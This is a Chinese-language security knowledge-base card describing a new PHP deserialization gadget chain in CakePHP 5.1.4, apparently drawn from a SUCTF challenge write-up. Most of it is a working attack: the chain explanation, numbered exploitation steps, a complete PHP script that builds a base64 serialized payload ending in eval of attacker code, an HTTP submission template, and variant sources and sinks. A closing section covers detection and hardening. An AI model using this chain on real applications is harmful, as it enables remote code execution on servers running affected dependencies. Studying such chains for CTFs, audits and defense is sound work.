---
id: web-php-deserialization-cakephp5-rejectedpromise-behaviorregistry-mockclass-eval
title: CakePHP 5.1.4 新 POP 链：RejectedPromise::__destruct 字符串拼接 → ConstTypeNode::__toString → ORM\Table::__call → BehaviorRegistry::call 任意无参方法 → PHPUnit MockClass::generate 的 eval
type: scenario
domain: web
path: web/php/deserialization
technique: cakephp5-rejectedpromise-behaviorregistry-mockclass-eval
aliases:
- CakePHP 反序列化
- CakePHP 5.1.4 POP 链
- RejectedPromise __destruct
- ConstTypeNode __toString
- BehaviorRegistry call 任意方法
- PHPUnit MockClass generate eval
- SUCTF CakePHP
tags:
- php
- deserialization
- pop-chain
- cakephp
- composer
- magic-methods
- destruct
- tostring
- call
- eval
- ctf
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: CakePHP 5.1.4（原文标注的测试版本）
verification:
  verified_by: verifier-T2-2
  verified_at: '2026-11-07T23:26:38+08:00'
  notes: 已对照 16552 原文与 img/01-13 核对：Symfony\Process 新增 __wakeup throw、RejectedPromise::__destruct 的 'Unhandled promise rejection with ' . reason 拼接、ConstTypeNode::__toString 转发、Table::__call→BehaviorRegistry::call 的 _methodMap/_loaded 任意方法调用、ServerCommand::execute 因需 2 参报 Too few arguments、MockClass::generate 的 class_exists+eval 均与图01-13 一致；exp 对象图与原文一致（命名空间 React\Promise\Internal、PHPStan\PhpDocParser\Ast\Type 正确，原文正文写的 src\Internal\RejectedPromise 已按源码纠正）；affected_versions 保留 5.1.4（原文即分析该版本 vendor 源码）；未验证点：未本地复跑 exp，未验证 mockName 取 MockClass 时是否被 autoload 命中而跳过 eval
---

## 一句话结论

CakePHP 5.1.4 里旧的 `Symfony\Process::__destruct` 入口被新增的 `__wakeup`（直接 throw）堵死，但 `React\Promise\Internal\RejectedPromise::__destruct` 仍会把可控的 `$reason` 拼进字符串，从而触发 `__toString`；把它指向 `PHPStan\PhpDocParser\Ast\Type\ConstTypeNode`（其 `__toString` 直接 `return $this->constExpr->__toString()`），再把 `constExpr` 换成一个没有 `__toString` 的 `Cake\ORM\Table` 对象，`__call` 就跳到 `BehaviorRegistry::call()`；该 `call()` 用攻击者可控的 `$_methodMap`/`$_loaded` 属性拼出 `$this->_loaded[$behavior]->{$callMethod}(...$args)`，以无参调用命中 `PHPUnit\Framework\MockObject\Generator\MockClass::generate()`，其 `eval($this->classCode)` 即任意代码执行。

## 原理

- **反序列化的入口必须是自动触发的方法**：`unserialize()` 后没有任何显式方法调用，只有 `__destruct`、`__wakeup`、`__toString` 等魔术方法会被自动/隐式调用，所以入口（source）只能从这些方法里选。
- **旧 source 被补丁封死**：3.x ≤ 3.9.6 与 4.x ≤ 4.2.3 的经典入口是 `Symfony\Process::__destruct`，但在 5.1.4 的 vendored 版本中该类新增了 `__wakeup()`，一进入反序列化就 `throw new \BadMethodCallException("Cannot unserialize ...")`；`__wakeup` 在 `__destruct` 之前执行，异常让析构不再发生（在 PHP 8.1 上也没有可靠的 `__wakeup` 绕过），所以必须重新找 source。
- **为什么选 RejectedPromise**：`React\Promise\Internal\RejectedPromise::__destruct()` 在未注册 rejection handler 时执行 `$message = 'Unhandled promise rejection with ' . $this->reason;` 再 `error_log($message)`。字符串拼接会把 `$reason` 强制转成字符串——若 `$reason` 是对象，就调用它的 `__toString()`，于是攻击者用一个对象属性就能把控制流带到任意 `__toString`。
- **为什么中间要过 ConstTypeNode**：直接给 `$reason` 一个 `Cake\ORM\Table` 对象不行，因为 `Table` 没有 `__toString`，拼接会致命错误；`ConstTypeNode::__toString()` 的实现是 `return $this->constExpr->__toString();`，它把“字符串化”这个动作转发给另一个可控属性，既可以指向有 `__toString` 的类，也可以指向**没有** `__toString` 的对象——后者会掉进 `__call`。
- **为什么能调用任意方法**：`Cake\ORM\Table::__call($method, $args)` 先查 `$this->behaviors->hasMethod($method)`，命中就 `return $this->behaviors->call($method, $args);`；`BehaviorRegistry::call()` 把 `$method` 转小写后，用 `hasMethod()`（读 `$_methodMap`）与 `has()`（读 `$_loaded`）两个**可控属性**做判断，然后执行 `[$behavior, $callMethod] = $this->_methodMap[$method]; return $this->_loaded[$behavior]->{$callMethod}(...$args);`。`$_methodMap` 与 `$_loaded` 都在对象属性里、反序列化可任意赋值，于是“方法名 → 目标对象 + 目标方法”的映射完全由攻击者定义，等于一个任意对象任意方法调用原语（参数为 `...$args`，`__call` 传入的是空数组）。
- **为什么 sink 必须是无参方法**：`__toString` → `__call` 的调用链不携带攻击者参数，`$args` 为空数组，因此目标方法必须能零参调用。原文先试 `Cake\Command\ServerCommand::execute(Arguments $args, ConsoleIo $io)`，它内部确有 `system($command)`，但运行时直接报 `Too few arguments ... exactly 2 expected`，证明“能调用”与“能执行”是两件事，必须挑无参方法。
- **为什么 MockClass::generate 能用**：`PHPUnit\Framework\MockObject\Generator\MockClass::generate()` 无参，方法体是 `if (!class_exists($this->mockName, false)) { eval($this->classCode); } call_user_func(...)`。`$mockName` 与 `$classCode` 都是 public 属性，反序列化可控；只要 `$mockName` 不是已存在的类，`eval($this->classCode)` 就执行任意 PHP 代码，这就是链尾的真实 RCE sink。
- **成立前提**：目标应用引入 cakephp/cakephp 5.x 的 ORM/Core 类、react/promise、phpstan/phpdoc-parser 与 phpunit/phpunit 的 MockObject 生成器（composer 依赖里含这些包，且反序列化输入可控），并且没有对 `unserialize()` 做类白名单。

## 触发条件

- 应用存在可控的反序列化入口（`unserialize($_POST/…])`、缓存、队列、session 等），且已加载上述类（CakePHP + 依赖包在 autoload 中）。
- 目标 CakePHP 版本为 5.x（原文为 5.1.4；旧版本有更短的历史链，不必用本条）。
- 目标未使用 `allowed_classes` 白名单、签名校验或 `unserialize` 前的完整性校验。
- 依赖中包含 `phpunit/phpunit`（`MockClass` 位于 `PHPUnit\Framework\MockObject\Generator`），或其它带 `eval` 的零参 gadget 可替代。

## 利用步骤

1. 确认项目 `composer.lock` 里 cakephp/cakephp 为 5.x、存在 react/promise、phpstan/phpdoc-parser、phpunit/phpunit；确认反序列化入口可控。
2. 按类定义拼对象图：`RejectedPromise->reason = ConstTypeNode`，`ConstTypeNode->constExpr = Table`，`Table->_behaviors = BehaviorRegistry`。
3. 配置 `BehaviorRegistry`：`_methodMap = ["__tostring" => ["MockClass", "generate"]]`（键名小写，因为 `call()` 先 `strtolower($method)`）、`_loaded = ["MockClass" => MockClass 实例]`。
4. 构造 `MockClass`：`mockName` 取一个不存在的类名（否则 `class_exists(..., false)` 为真会跳过 eval），`classCode` 为要执行的 PHP 代码（如 `phpinfo();` 或写文件/命令执行语句）。
5. `serialize` 后 Base64 编码提交到入口；`unserialize` 结束、对象析构时 `__destruct` 拼接 `$reason` → `ConstTypeNode::__toString` → `Table::__call('__tostring')` → `BehaviorRegistry::call` → `MockClass::generate()` → `eval(classCode)`。
6. 若 `eval` 被 `disable_functions` 禁用或 `MockClass` 不在 autoload 中，改用其它零参 gadget（任何无参且把属性当代码/命令执行的方法）替换 `_methodMap` 的目标。

## PoC

构造脚本（类与命名空间按 vendor 实际路径对齐，原文的写法）：

```php
<?php
namespace PHPUnit\Framework\MockObject\Generator;
final class MockClass {
    public $mockName;
    public $classCode;
    public function __construct() {
        $this->mockName  = "MockClass";      // 必须是不存在的类名，才会走 eval
        $this->classCode = "phpinfo();";     // 任意 PHP
    }
}

namespace Cake\Core;
abstract class ObjectRegistry { public $_loaded = []; }

namespace Cake\ORM;
use Cake\Core\ObjectRegistry;
use PHPUnit\Framework\MockObject\Generator\MockClass;
class BehaviorRegistry extends ObjectRegistry {
    public $count;                 // 仅为让类形状与源码一致
    public $_methodMap = [];
    public function count(): int {}
}
class Table {
    public BehaviorRegistry $_behaviors;
    public function __construct() {
        $mc = new MockClass();
        $this->_behaviors = new BehaviorRegistry();
        $this->_behaviors->_methodMap = ["__tostring" => ["MockClass", "generate"]];
        $this->_behaviors->_loaded    = ["MockClass" => $mc];
    }
}

namespace React\Promise\Internal;
final class RejectedPromise { public $reason; }

namespace PHPStan\PhpDocParser\Ast;
interface Node {}

namespace PHPStan\PhpDocParser\Ast\Type;
use Cake\ORM\Table;
use React\Promise\Internal\RejectedPromise;
interface TypeNode extends Node {}
class ConstTypeNode { public $constExpr; }

namespace {
    $pop = new RejectedPromise();
    $pop->reason = new \PHPStan\PhpDocParser\Ast\Type\ConstTypeNode();
    $pop->reason->constExpr = new \Cake\ORM\Table();
    echo base64_encode(serialize($pop));
}
```

提交：

```http
POST /unserialize-entry HTTP/1.1
Content-Type: application/x-www-form-urlencoded

data=<base64(serialize($pop))>
```

说明：原文用一个 SUCTF 题目的本地 vendor 源码调试出该链并给出上述 exp；`MockClass` 的 `mockName` 在原文示例中写成 `"MockClass"`，若该名字已被 autoload 解析会跳过 `eval`，实战中应换成随机不存在的类名。原文未在真实目标上执行，本卡未复跑。

## 变体与关联

- **source 变体**：任何“未处理的 `__destruct` 就把属性拼进字符串/log/`preg_match`”的类都可作为入口，不限于 `RejectedPromise`；CakePHP 包里 `Console\ConsoleInput::__destruct`、`Cache\RedisEngine::__destruct` 等 `__destruct` 也可作为候选（原文用全局搜索 `__destruct` 的做法就是这类枚举）。
- **中转变体**：任何 `__toString` 里“把另一个属性再转字符串”的类都可替代 `ConstTypeNode`；也可直接用“有 `__toString` 且内部调用可控对象方法”的类跳过中转。
- **sink 变体**：`MockClass::generate` 之外，任何**零参**且把可控属性当代码/命令执行的方法都可作为终点（如 `eval`、`system`、`assert`、`file_put_contents` 的零参包装）；原文实测 `ServerCommand::execute` 因需要 2 个参数而失败，说明“参数个数”是选 sink 的硬约束。
- **版本变体**：3.x ≤ 3.9.6 / 4.x ≤ 4.2.3 走 `Symfony\Process::__destruct` 的历史链；5.x 因 `__wakeup` throw 失效，才需要本条新链。
- 关联：[[web-php-deserialization-magic-chain-eval-wakeup-bypass]]（另一条魔术方法链到 eval，含 `__wakeup` 属性数绕过）、[[web-php-deserialization-call-variable-class-method-reflection-invokeargs]]（`__call` + 变量类/方法调用的同类原语）、[[web-php-deserialization-destruct-system-webshell-base64]]（`__destruct` 直连命令执行的短链）。
- 边界：`allowed_classes` 白名单、`unserialize` 前的 HMAC 签名、依赖里没有 PHPUnit（或 `MockClass` 被裁剪）、`disable_functions` 禁用 `eval`、或链中任一属性被改为 private/protected 导致序列化需改写键名时，需按实际环境调整。

## 检测与防御

- 检测（审计）：`unserialize` 可控入口 + composer 里同时存在 cakephp/cakephp、react/promise、phpstan/phpdoc-parser、phpunit/phpunit；代码中出现 `__destruct` 里字符串拼接属性、`__toString` 转发字符串化、`ObjectRegistry::_methodMap`/`BehaviorRegistry::call` 的 `$this->_loaded[...]` 动态方法调用。
- 检测（运行时）：请求体中出现 `O:` 序列化串且类名含 `RejectedPromise`/`ConstTypeNode`/`BehaviorRegistry`/`MockClass`；反序列化后进程出现 `eval` 相关行为、异常堆栈含 `MockClass::generate`。
- 修复：不要对不可信输入调用 `unserialize()`，改用 `json_decode` 等无对象实例化的格式；必须反序列化时使用 `allowed_classes` 白名单 + 只允许值类型。
- 加固：生产环境不安装 `phpunit/phpunit`（用 `--no-dev` 部署），减少 vendor 中的 gadget 面；`disable_functions` 覆盖 `eval`、`assert`、`system` 等；对序列化数据做 HMAC 签名并校验；对 `__destruct`/`__toString`/`__call` 中把属性当代码/字符串使用的位置做代码审计。
